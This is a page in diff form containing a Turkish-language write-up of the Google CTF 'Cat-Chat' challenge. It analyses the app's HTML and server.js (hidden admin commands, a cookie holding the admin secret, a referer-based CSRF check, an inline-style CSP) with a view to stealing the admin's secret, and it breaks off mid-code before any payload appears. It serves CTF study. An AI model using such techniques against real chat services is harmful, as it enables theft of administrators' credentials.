@@ -1,0 +1,390 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html {
+      max-width: 70ch;
+      margin: auto;
+      line-height: 1.75;
+      font-size: 1.25em;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    nav ul {
+      background: #faca46;
+      text-align: center;
+    }
+
+    nav ul li {
+      display: inline-block;
+      color: white;
+      margin-right: 10px;
+    }
+
+    nav ul li a {
+      text-decoration: none;
+    }
+
+    img {
+      width: 100%;
+    }
+  </style>
+</head>
+
+<nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="https://github.com/i64">Git</a></li>
+  </ul>
+</nav><h1>Cat-Chat  - Google CTF</h1>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">You discover this cat enthusiast chat app, but the annoying thing about it is that you’re always banned when you start talking about dogs. Maybe if you would somehow get to know the admin’s password, you could fix that.
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">https://cat-chat.web.ctfcompetition.com/
+</span>
+</code></pre>
+<h3>Ön inceleme</h3>
+<ul>
+<li><strong>/name yeni_isim</strong> ile isim değiştiriliyor</li>
+<li><strong>/report</strong> dediğimiz zaman <strong>Dog talk</strong> konuşanları <strong>gelip</strong> banlıyor</li>
+<li>kaynak kodu verilmiş</li>
+</ul>
+<p><img src="cat-chat1.png" alt="ilkEkran" /></p>
+<p>Bizden istenilen ise admin parolası veya session bilgisi. Kafamızda direk XSS sorusu dedik kendi kendimize.</p>
+<p><strong>/report</strong>'u deniyelim</p>
+<p><img src="cat-chat2.png" alt="ilkEkran" /></p>
+<p><strong>iv3m</strong> kullanıcısından reportlayıp <strong>roll</strong> kullanıcısından <strong>dog</strong> yazdık. Ve <strong>admin</strong> gelip <strong>roll</strong> kullanıcısını banladı.(<strong>ban</strong> adlı cookie'yi 1 olarak set etti)</p>
+<ul>
+<li>Admin geldiğine göre bunu bir köşeye yazalım.</li>
+</ul>
+<h3>Analiz ve hata keşfi</h3>
+<p>Kaynak koduna baktığımızda(html source)</p>
+<pre style="background-color:#fdf6e3;" lang="html"><code>
+<span style="color:#93a1a1;">&lt;!</span><span style="color:#268bd2;">DOCTYPE</span><span style="color:#657b83;"> html</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">html</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">head</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">meta </span><span style="color:#b58900;">charset</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">utf-8</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">title</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Cat Chat</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">title</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">script </span><span style="color:#b58900;">src</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">/catchat.js</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;/</span><span style="color:#268bd2;">script</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">script </span><span style="color:#b58900;">src</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;&lt;/</span><span style="color:#268bd2;">script</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">link </span><span style="color:#b58900;">rel</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">stylesheet</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">text/css</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">href</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">/style.css</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">head</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">div </span><span style="color:#b58900;">id</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">panel</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">div </span><span style="color:#b58900;">id</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">conversation</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Welcome to Cat Chat! This is your brand new room where you can discuss anything related to cats. You have been assigned a random nick name that you can change any time.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Rules:</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">- You may invite anyone to this chat room. Just share the URL.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">- Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Commands you can use: (just type a message starting with slash to invoke commands)</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">- `/name YourNewName` - Change your nick name to YourNewName.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">- `/report` - Report dog talk to the admin.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;!--
+</span><span style="color:#93a1a1;">        Admin commands:
+</span><span style="color:#93a1a1;">        - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It&#39;s enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
+</span><span style="color:#93a1a1;">        - `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).
+</span><span style="color:#93a1a1;">      --&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Btw, the core of the chat engine is open source! You can download the source code </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">a </span><span style="color:#b58900;">href</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">/server.js</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">here</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">a</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">.</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">p </span><span style="color:#b58900;">style</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#859900;">margin-bottom</span><span style="color:#657b83;">: </span><span style="color:#6c71c4;">5</span><span style="color:#859900;">em</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Alright, have fun!</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">p</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">input </span><span style="color:#b58900;">id</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">messagebox</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">autofocus</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">html</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p>( tüm kodu yapıştırma sebebim belki soruları geri bulamayız )</p>
+<p>2 adet admin komutu öğrenmiş olduk</p>
+<ul>
+<li><strong>/secret xxx</strong> komutu <strong>flag</strong> adlı cookie'yi <strong>xxx</strong> olarak set ediyor.</li>
+<li><strong>/ban kullanıcıAdı</strong> admin şifresi yani flag doğru ise hedef kişiyi banlıyor.</li>
+</ul>
+<h4>Server-side kod inceleme</h4>
+<p>Back-end tarafını bizimle paylaşmıştı <a href="https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/server.js">server.js</a></p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#268bd2;">const </span><span style="color:#859900;">http </span><span style="color:#657b83;">= </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">http</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">express = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">express</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">cookieParser = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">cookie-parser</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">uuidv4 = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">uuid/v4</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">SSEClient = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">sse</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">).Client;
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">admin = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">./admin</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#268bd2;">const </span><span style="color:#657b83;">pubsub = </span><span style="color:#b58900;">require</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">@google-cloud/pubsub</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)();
+</span>
+</code></pre>
+<p>Temal kütüphane importları ve <strong>admin.js</strong>'i import ediyor. Malesef <strong>admin.js</strong>'e erişimimiz yok</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#268bd2;">const </span><span style="color:#657b83;">app = </span><span style="color:#b58900;">express</span><span style="color:#657b83;">();
+</span><span style="color:#657b83;">app.</span><span style="color:#b58900;">set</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">etag</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#b58900;">false</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">app.</span><span style="color:#b58900;">use</span><span style="color:#657b83;">(</span><span style="color:#b58900;">cookieParser</span><span style="color:#657b83;">());
+</span>
+</code></pre>
+<p><strong>app.set('etag', false)</strong> entity-tag kapatılmış. Anlayacağımız web-cache validation yok.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">app.</span><span style="color:#b58900;">use</span><span style="color:#657b83;">(admin.middleware);
+</span>
+</code></pre>
+<p><strong>flag</strong> cookiesi'ni kontrol edip admin mi değil mi diye kontrol ediyor</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">app.</span><span style="color:#b58900;">use</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">function</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">next</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">  </span><span style="color:#859900;">if </span><span style="color:#657b83;">(req.cookies.banned) {
+</span><span style="color:#657b83;">    res.</span><span style="color:#b58900;">sendStatus</span><span style="color:#657b83;">(</span><span style="color:#6c71c4;">403</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">    res.</span><span style="color:#b58900;">end</span><span style="color:#657b83;">();
+</span><span style="color:#657b83;">  } </span><span style="color:#859900;">else </span><span style="color:#657b83;">{
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">next</span><span style="color:#657b83;">();
+</span><span style="color:#657b83;">  }
+</span><span style="color:#657b83;">});
+</span>
+</code></pre>
+<p>Kullanıcı'nın banlı olup olmadığını kontrol ediyor. Eğer banlı ise <strong>403</strong> sayfasına yönlendiriyor.</p>
+<pre lang="js" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">app.</span><span style="color:#b58900;">get</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, (</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">) </span><span style="color:#268bd2;">=&gt; </span><span style="color:#657b83;">res.</span><span style="color:#b58900;">redirect</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#2aa198;">/room/</span><span style="color:#657b83;">${</span><span style="color:#b58900;">uuidv4</span><span style="color:#657b83;">()}</span><span style="color:#2aa198;">/</span><span style="color:#839496;">`</span><span style="color:#657b83;">));
+</span><span style="color:#268bd2;">let </span><span style="color:#657b83;">roomPath = </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/room/:room([0-9a-f-]{36})</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">app.</span><span style="color:#b58900;">get</span><span style="color:#657b83;">(roomPath + </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">function</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">  res.</span><span style="color:#b58900;">sendFile</span><span style="color:#657b83;">(</span><span style="color:#859900;">__dirname </span><span style="color:#657b83;">+ </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/static/index.html</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, {
+</span><span style="color:#657b83;">    headers: {
+</span><span style="color:#657b83;">      </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Content-Security-Policy</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">: </span><span style="color:#268bd2;">[
+</span><span style="color:#657b83;">        </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">default-src </span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;">self</span><span style="color:#dc322f;">\&#39;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,
+</span><span style="color:#657b83;">        </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">style-src </span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;">unsafe-inline</span><span style="color:#dc322f;">\&#39; \&#39;</span><span style="color:#2aa198;">self</span><span style="color:#dc322f;">\&#39;</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,
+</span><span style="color:#657b83;">        </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">script-src </span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;">self</span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;"> https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,
+</span><span style="color:#657b83;">        </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">frame-src </span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;">self</span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;"> https://www.google.com/recaptcha/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">,
+</span><span style="color:#657b83;">      </span><span style="color:#268bd2;">]</span><span style="color:#657b83;">.</span><span style="color:#b58900;">join</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">; </span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)
+</span><span style="color:#657b83;">    },
+</span><span style="color:#657b83;">  });
+</span><span style="color:#657b83;">});
+</span>
+</code></pre>
+<p>eğer <strong>/</strong> dizinine gidersek bize benzersiz bir id atayıp <strong>/static/index.html</strong>'in içeriğini göstercekmiş. Ayrıca <a href="https://www.netsparker.com.tr/blog/web-guvenligi/CSP-Content-Security-Policy/"><strong>CSP</strong></a> kısıtlamaları ve ayrıcalıkları verilmiş.</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#839496;">&#39;</span><span style="color:#2aa198;">style-src </span><span style="color:#dc322f;">\&#39;</span><span style="color:#2aa198;">unsafe-inline</span><span style="color:#dc322f;">\&#39; \&#39;</span><span style="color:#2aa198;">self</span><span style="color:#dc322f;">\&#39;</span><span style="color:#839496;">&#39;
+</span>
+</code></pre>
+<p>kısmını unutmamakta fayda var. Yani inline şekilde olan style ayarlarına izin var.</p>
+<pre style="background-color:#fdf6e3;" lang="js"><code>
+<span style="color:#657b83;">app.</span><span style="color:#b58900;">all</span><span style="color:#657b83;">(roomPath + </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/send</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">async function</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">req</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">res</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">  </span><span style="color:#268bd2;">let </span><span style="color:#657b83;">room = req.params.room, {msg, name} = req.query, response = {}, arg;
+</span><span style="color:#657b83;">  </span><span style="color:#859900;">console</span><span style="color:#657b83;">.</span><span style="color:#859900;">log</span><span style="color:#657b83;">(</span><span style="color:#839496;">`</span><span style="color:#657b83;">${room}</span><span style="color:#2aa198;"> &lt;-- (</span><span style="color:#657b83;">${name}</span><span style="color:#2aa198;">):</span><span style="color:#839496;">`</span><span style="color:#657b83;">, msg)
+</span><span style="color:#657b83;">  </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(req.headers.referer </span><span style="color:#859900;">|| </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">replace</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#859900;">^</span><span style="color:#2aa198;">https</span><span style="color:#859900;">?</span><span style="color:#2aa198;">:</span><span style="color:#dc322f;">\/\/</span><span style="color:#839496;">/</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;&#39;</span><span style="color:#657b83;">).</span><span style="color:#b58900;">startsWith</span><span style="color:#657b83;">(req.headers.host)) {
+</span><span style="color:#657b83;">    response = {type: </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">error</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">, error: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">CSRF protection error</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
+</span><span style="color:#657b83;">  } </span><span style="color:#859900;">else if </span><span style="color:#657b83;">(msg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">] </span><span style="color:#657b83;">!= </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">msg</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name, msg});
+</span><span style="color:#657b83;">  } </span><span style="color:#859900;">else </span><span style="color:#657b83;">{
+</span><span style="color:#657b83;">    </span><span style="color:#859900;">switch </span><span style="color:#657b83;">(msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#859900;">^</span><span style="color:#dc322f;">\/</span><span style="color:#cb4b16;">[</span><span style="color:#859900;">^ </span><span style="color:#cb4b16;">]</span><span style="color:#859900;">*</span><span style="color:#839496;">/</span><span style="color:#657b83;">)</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">) {
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/name</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">name (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        response = {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">rename</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">};
+</span><span style="color:#657b83;">        </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">name</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">, old: name});
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/ban</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">ban (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">req.admin) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        </span><span style="color:#b58900;">broadcast</span><span style="color:#657b83;">(room, {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">ban</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, name: arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">});
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">secret (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        res.</span><span style="color:#b58900;">setHeader</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">Set-Cookie</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">, </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">flag=</span><span style="color:#839496;">&#39; </span><span style="color:#657b83;">+ arg</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">1</span><span style="color:#268bd2;">] </span><span style="color:#657b83;">+ </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">; Path=/; Max-Age=31536000</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">);
+</span><span style="color:#657b83;">        response = {type: </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">secret</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">};
+</span><span style="color:#657b83;">      </span><span style="color:#859900;">case </span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">/report</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">if </span><span style="color:#657b83;">(</span><span style="color:#859900;">!</span><span style="color:#657b83;">(arg = msg.</span><span style="color:#b58900;">match</span><span style="color:#657b83;">(</span><span style="color:#839496;">/</span><span style="color:#dc322f;">\/</span><span style="color:#2aa198;">report (</span><span style="color:#cb4b16;">.</span><span style="color:#859900;">+</span><span style="color:#2aa198;">)</span><span style="color:#839496;">/</span><span style="color:#657b83;">))) </span><span style="color:#859900;">break</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        </span><span style="color:#268bd2;">var </span><span style="color:#657b83;">ip = req.headers</span><span style="color:#268bd2;">[</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">x-forwarded-for</span><span style="color:#839496;">&#39;</span><span style="color:#268bd2;">]</span><span style="color:#657b83;">;
+</span><span style="color:#657b83;">        ip = ip </span><span style="color:#859900;">? </span><span style="color:#657b83;">ip.</span><span style="color:#b58900;">split</span><span style="color:#657b83;">(</span><span style="color:#839496;">&#39;</span><span style="color:#2aa198;">,</span><span style="color:#839496;">&#39;</span><span style="color:#657b83;">)</span><span style="color:#268bd2;">[</span><span style="color:#6c71c4;">0</span><span style="color:#268bd2;">] </span><span style="color:#859900;">: </span><span style="color:#657b83;">req.connection.remoteAddress;
